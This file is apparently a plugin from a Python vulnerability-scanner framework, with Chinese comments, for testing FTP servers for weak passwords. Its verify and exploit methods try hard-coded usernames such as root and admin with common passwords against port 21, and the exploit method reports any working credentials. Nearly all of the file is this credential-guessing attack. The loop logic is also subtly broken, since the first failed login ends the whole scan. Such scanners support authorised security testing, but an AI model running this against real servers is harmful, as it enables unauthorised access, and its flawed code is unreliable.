# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import ftplib


class Vuln(ABVuln):
    vuln_id = 'crack_ftp'  # 平台漏洞编号
    name = 'FTP弱口令'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.MISCONFIGURATION  # 漏洞类型
    disclosure_date = 'Unknown'  # 漏洞公布时间
    desc = '''
        导致敏感信息泄露，严重情况可导致服务器被入侵控制。
    '''  # 漏洞描述
    ref = 'Unknown'
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'ftp'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'f71f0376-3e3a-4f7d-b3dc-8545d17ae4b9'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-01'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        # FTP弱口令 输入ip进行测试
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            timeout = 10
            user_list = ['ftp', 'www', 'admin',
                         'root', 'db', 'wwwroot', 'data', 'web']
            password_list = ['root', 'admin', '123456', '12345789',
                             'manage', 'P@ssw0rd', 'password', 'changeme', 'ftp']
            try:
                for user in user_list:
                    for password in password_list:
                        ftp = ftplib.FTP()
                        ftp.timeout = timeout
                        ftp.connect(arg, 21)
                        ftp.login(user, password)
                        self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))
            except Exception as e:
                self.output.info('执行异常{}'.format(e))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            timeout = 10
            user_list = ['ftp', 'www', 'admin',
                         'root', 'db', 'wwwroot', 'data', 'web']
            password_list = ['root', 'admin', '123456', '12345789',
                             'manage', 'P@ssw0rd', 'password', 'changeme', 'ftp']
            try:
                for user in user_list:
                    for password in password_list:
                        ftp = ftplib.FTP()
                        ftp.timeout = timeout
                        ftp.connect(arg, 21)
                        ftp.login(user, password)
                        self.output.report(self.vuln, '发现{target}存在{name}漏洞，获取到的用户名为{username} 用户名密码为{password}'.format(
                            target=self.target, name=self.vuln.name, username=user, password=password))
            except Exception as e:
                self.output.info('执行异常{}'.format(e))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
